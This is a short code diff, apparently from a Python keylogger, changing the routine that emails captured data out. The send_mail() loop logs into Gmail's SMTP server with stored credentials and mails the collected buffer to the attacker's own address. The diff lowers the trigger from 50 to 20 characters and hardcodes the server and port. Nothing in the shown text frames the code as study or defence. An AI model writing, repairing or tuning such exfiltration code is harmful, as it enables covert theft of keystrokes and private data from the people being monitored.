@@ -46,10 +46,8 @@ lastwindow = ''
 def send_mail():
     global data
     while True:
-        if len(data) > 50:
+        if len(data) > 20:
             timeInSecs = datetime.now()
-            SERVER = "smtp.gmail.com"
-            PORT = 587
             PASS = PAS
             FROM = FRM
             TO = FRM
@@ -63,8 +61,8 @@ def send_mail():
                                 "",
                                 MESSAGE))
             try:
-                server = smtplib.SMTP()
-                server.connect(SERVER, PORT)
+                server = smtplib.SMTP('smtp.gmail.com')
+                server.connect('smtp.gmail.com', '587')
                 server.starttls()
                 server.login(FROM, PASS)
                 server.sendmail(FROM, TO, message_payload)
